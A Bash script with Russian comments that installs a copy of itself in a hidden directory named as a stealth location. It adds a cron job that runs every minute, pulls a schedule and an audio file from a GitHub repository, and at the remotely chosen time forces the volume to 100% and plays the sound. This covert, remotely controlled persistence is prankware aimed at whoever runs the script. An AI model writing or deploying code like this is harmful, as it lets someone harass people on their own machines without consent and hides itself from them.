#!/bin/bash

# Конфигурация GitHub
GITHUB_USER="Graf-Durka"
GITHUB_REPO="Script"
GITHUB_BRANCH="main"

# URL ресурсов на GitHub
SCHEDULE_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/schedule.txt"
AUDIO_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/audio.opus"

# Локальные настройки
STEALTH_DIR="$HOME/.local/share/audio_service"
TEMP_AUDIO="/dev/shm/audio_$(date +%s).opus"
LOCK_FILE="/tmp/audio_service.lock"
CRON_TAG="AUDIO_SERVICE_TIMED"

# Функция загрузки файла с GitHub
download_from_github() {
    local url="$1"
    local output="$2"
    
    if command -v curl >/dev/null; then
        if ! curl -sSL --connect-timeout 10 --retry 2 "$url" -o "$output"; then
            echo "Ошибка загрузки: $url" >&2
            return 1
        fi
    elif command -v wget >/dev/null; then
        if ! wget -q --timeout=10 --tries=2 "$url" -O "$output"; then
            echo "Ошибка загрузки: $url" >&2
            return 1
        fi
    else
        echo "Ошибка: Не найден curl или wget!" >&2
        return 1
    fi
    
    # Проверяем, что файл не пустой
    if [[ ! -s "$output" ]]; then
        echo "Файл пустой: $url" >&2
        rm -f "$output"
        return 1
    fi
    return 0
}

# Функция получения времени запуска
get_schedule_time() {
    local schedule_file="/dev/shm/schedule_$(date +%s).txt"
    
    # Пытаемся загрузить актуальное расписание
    if download_from_github "$SCHEDULE_URL" "$schedule_file"; then
        # Читаем время из файла (формат: HH:MM)
        SCHEDULE_TIME=$(head -1 "$schedule_file" | grep -E '^([0-1][0-9]|2[0-3]):[0-5][0-9]$')
        rm -f "$schedule_file"
        
        if [[ -n "$SCHEDULE_TIME" ]]; then
            echo "$SCHEDULE_TIME"
            return 0
        else
            echo "Неверный формат времени в schedule.txt" >&2
        fi
    fi
    
    # Fallback: случайное время, если не удалось загрузить
    printf "%02d:%02d" $((RANDOM % 24)) $((RANDOM % 60))
}

# Функция проверки, нужно ли воспроизводить звук сейчас
should_play_now() {
    local target_time=$(get_schedule_time)
    local current_time=$(date +%H:%M)
    
    # Сравниваем текущее время с целевым
    if [[ "$current_time" == "$target_time" ]]; then
        echo "✅ Время воспроизведения: $target_time (текущее: $current_time)"
        return 0
    else
        echo "⏰ Не время для воспроизведения (ожидание: $target_time, текущее: $current_time)"
        return 1
    fi
}

# Функция обновления cron
update_cron_job() {
    local schedule_time=$(get_schedule_time)
    local hour=$(echo "$schedule_time" | cut -d: -f1)
    local minute=$(echo "$schedule_time" | cut -d: -f2)
    
    # Удаляем старые записи
    crontab -l 2>/dev/null | grep -v "$CRON_TAG" | crontab -
    
    # Добавляем новую запись (запуск каждую минуту для проверки времени)
    CRON_JOB="* * * * * $STEALTH_DIR/audio_service.sh --check-time #$CRON_TAG"
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    
    echo "Установлено расписание: проверка каждую минуту, воспроизведение в $schedule_time"
}

# Функция воспроизведения
play_audio() {
    # Блокировка от параллельного выполнения
    exec 9>"$LOCK_FILE"
    flock -n 9 || exit 1
    
    # Загружаем аудио с GitHub
    if ! download_from_github "$AUDIO_URL" "$TEMP_AUDIO"; then
        echo "Не удалось загрузить аудио!" >&2
        flock -u 9
        return 1
    fi
    
    # Управление громкостью
    if command -v pactl &>/dev/null; then
        ORIG_VOL=$(pactl get-sink-volume @DEFAULT_SINK@ | grep -oP '\d+%' | head -1)
        pactl set-sink-volume @DEFAULT_SINK@ 100%
        echo "Громкость установлена на 100% (было: $ORIG_VOL)"
    fi
    
    # Воспроизведение
    local success=0
    if command -v ffmpeg &>/dev/null; then
        echo "Воспроизведение через ffmpeg + paplay..."
        if ffmpeg -loglevel quiet -i "$TEMP_AUDIO" -f wav - | paplay - 2>/dev/null; then
            success=1
        fi
    fi
    
    if [[ $success -eq 0 ]]; then
        echo "Пробуем прямое воспроизведение..."
        if command -v paplay &>/dev/null; then
            paplay "$TEMP_AUDIO" 2>/dev/null && success=1
        elif command -v aplay &>/dev/null; then
            aplay "$TEMP_AUDIO" 2>/dev/null && success=1
        fi
    fi
    
    # Восстановление системы
    sleep 0.5
    [[ -n "$ORIG_VOL" ]] && pactl set-sink-volume @DEFAULT_SINK@ "$ORIG_VOL"
    rm -f "$TEMP_AUDIO"
    flock -u 9
    
    if [[ $success -eq 1 ]]; then
        echo "✅ Аудио успешно воспроизведено"
        return 0
    else
        echo "❌ Не удалось воспроизвести аудио"
        # Генерируем fallback-звук
        echo -e "\a"  # Системный beep
        sleep 0.5
        echo -e "\a"  # Системный beep
        return 1
    fi
}

# Функция установки
install_self() {
    mkdir -p "$STEALTH_DIR"
    
    # Сохраняем текущий скрипт в скрытую директорию
    cat > "$STEALTH_DIR/audio_service.sh" << 'EOF'
#!/bin/bash

# Конфигурация GitHub
GITHUB_USER="Graf-Durka"
GITHUB_REPO="Script"
GITHUB_BRANCH="main"

# URL ресурсов на GitHub
SCHEDULE_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/schedule.txt"
AUDIO_URL="https://raw.githubusercontent.com/$GITHUB_USER/$GITHUB_REPO/$GITHUB_BRANCH/audio.opus"

# Локальные настройки
STEALTH_DIR="$HOME/.local/share/audio_service"
TEMP_AUDIO="/dev/shm/audio_$(date +%s).opus"
LOCK_FILE="/tmp/audio_service.lock"
CRON_TAG="AUDIO_SERVICE_TIMED"

# Функция загрузки файла с GitHub
download_from_github() {
    local url="$1"
    local output="$2"
    
    if command -v curl >/dev/null; then
        if ! curl -sSL --connect-timeout 10 --retry 2 "$url" -o "$output"; then
            return 1
        fi
    elif command -v wget >/dev/null; then
        if ! wget -q --timeout=10 --tries=2 "$url" -O "$output"; then
            return 1
        fi
    else
        return 1
    fi
    
    if [[ ! -s "$output" ]]; then
        rm -f "$output"
        return 1
    fi
    return 0
}

# Функция получения времени запуска
get_schedule_time() {
    local schedule_file="/dev/shm/schedule_$(date +%s).txt"
    
    if download_from_github "$SCHEDULE_URL" "$schedule_file"; then
        SCHEDULE_TIME=$(head -1 "$schedule_file" | grep -E '^([0-1][0-9]|2[0-3]):[0-5][0-9]$')
        rm -f "$schedule_file"
        
        if [[ -n "$SCHEDULE_TIME" ]]; then
            echo "$SCHEDULE_TIME"
            return 0
        fi
    fi
    
    printf "%02d:%02d" $((RANDOM % 24)) $((RANDOM % 60))
}

# Функция проверки, нужно ли воспроизводить звук сейчас
should_play_now() {
    local target_time=$(get_schedule_time)
    local current_time=$(date +%H:%M)
    
    if [[ "$current_time" == "$target_time" ]]; then
        return 0
    else
        return 1
    fi
}

# Функция воспроизведения
play_audio() {
    exec 9>"$LOCK_FILE"
    flock -n 9 || exit 1
    
    if ! download_from_github "$AUDIO_URL" "$TEMP_AUDIO"; then
        flock -u 9
        return 1
    fi
    
    if command -v pactl &>/dev/null; then
        ORIG_VOL=$(pactl get-sink-volume @DEFAULT_SINK@ | grep -oP '\d+%' | head -1)
        pactl set-sink-volume @DEFAULT_SINK@ 100%
    fi
    
    local success=0
    if command -v ffmpeg &>/dev/null; then
        ffmpeg -loglevel quiet -i "$TEMP_AUDIO" -f wav - | paplay - 2>/dev/null && success=1
    fi
    
    if [[ $success -eq 0 ]]; then
        if command -v paplay &>/dev/null; then
            paplay "$TEMP_AUDIO" 2>/dev/null && success=1
        elif command -v aplay &>/dev/null; then
            aplay "$TEMP_AUDIO" 2>/dev/null && success=1
        fi
    fi
    
    sleep 0.5
    [[ -n "$ORIG_VOL" ]] && pactl set-sink-volume @DEFAULT_SINK@ "$ORIG_VOL"
    rm -f "$TEMP_AUDIO"
    flock -u 9
    
    if [[ $success -eq 1 ]]; then
        return 0
    else
        echo -e "\a"
        sleep 0.5
        echo -e "\a"
        return 1
    fi
}

# Точка входа
case "$1" in
    "--check-time")
        if should_play_now; then
            play_audio
        fi
        ;;
    "--play")
        play_audio
        ;;
    *)
        echo "Использование: $0 --check-time | --play"
        ;;
esac
EOF

    chmod +x "$STEALTH_DIR/audio_service.sh"
    update_cron_job
    
    echo "Установка завершена."
    echo "Скрипт будет проверять время каждую минуту и воспроизводить звук в указанное время."
    echo "Текущее расписание: $(get_schedule_time)"
    echo ""
    echo "Для принудительного запуска: $STEALTH_DIR/audio_service.sh --play"
    echo "Для проверки времени: $STEALTH_DIR/audio_service.sh --check-time"
}

# Точка входа
case "${1:-}" in
    "--check-time"|"--play")
        if [[ -f "$STEALTH_DIR/audio_service.sh" ]]; then
            exec "$STEALTH_DIR/audio_service.sh" "$@"
        else
            echo "Ошибка: Скрипт не установлен! Сначала запустите без параметров." >&2
            exit 1
        fi
        ;;
    "--test")
        echo "Тестирование аудио..."
        if [[ -f "$STEALTH_DIR/audio_service.sh" ]]; then
            exec "$STEALTH_DIR/audio_service.sh" "--play"
        else
            echo "Скрипт не установлен. Устанавливаем..."
            install_self
        fi
        ;;
    *)
        install_self
        ;;
esac
